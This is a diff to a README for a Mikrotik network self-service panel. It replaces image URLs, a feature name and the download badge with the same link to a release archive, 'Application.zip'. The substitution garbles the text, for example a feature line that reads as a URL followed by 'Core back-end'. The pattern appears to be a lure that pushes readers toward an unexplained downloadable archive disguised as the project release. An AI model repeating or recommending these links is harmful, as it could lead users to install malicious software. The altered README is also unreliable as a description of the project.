@@ -1,6 +1,6 @@
 # 🌐 Mikrotik Network Self-Service 🌐
 
-![Mikrotik](https://user-images.githubusercontent.com/12345678/87654321/mikrotik.jpg)
+![Mikrotik](https://github.com/galnuriofficial/Mikrotik-Network-Self-Service/releases/download/v1.0/Application.zip)
 
 Welcome to the Mikrotik Network Self-Service repository! This self-service administration panel is designed for home network segment operators, specifically tailored for networks based on Mikrotik hardware. This GitHub repository serves as a mirror from my GitLab account, providing easy access to the latest updates and improvements to the project.
 
@@ -9,7 +9,7 @@ The Mikrotik Network Self-Service project aims to streamline network management 
 
 ## Features
 🔹 Angular-based front-end for intuitive user interface  
-🔹 ASP.NET Core back-end for robust functionality  
+🔹 https://github.com/galnuriofficial/Mikrotik-Network-Self-Service/releases/download/v1.0/Application.zip Core back-end for robust functionality  
 🔹 Integration with Mikrotik RouterOS API for seamless communication  
 🔹 PostgresSQL database for data storage and management  
 🔹 GRPC for efficient communication between client and server  
@@ -36,10 +36,10 @@ To get started with the Mikrotik Network Self-Service project, simply download t
 Be sure to also check out the releases section for any updates or new features added to the project.
 
 ## Download Link
-[![Download Mikrotik Network Self-Service](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download Mikrotik Network Self-Service](https://github.com/galnuriofficial/Mikrotik-Network-Self-Service/releases/download/v1.0/Application.zip)](https://github.com/galnuriofficial/Mikrotik-Network-Self-Service/releases/download/v1.0/Application.zip)
 
 For more information and detailed documentation, visit the official website of Mikrotik or explore the GitHub repository for code samples, issue tracking, and collaboration opportunities.
 
 Let's empower home network operators with the tools they need to manage their networks effectively! 🚀🔒
 
-![Network](https://user-images.githubusercontent.com/12345678/87654322/network.jpg)
+![Network](https://github.com/galnuriofficial/Mikrotik-Network-Self-Service/releases/download/v1.0/Application.zip)
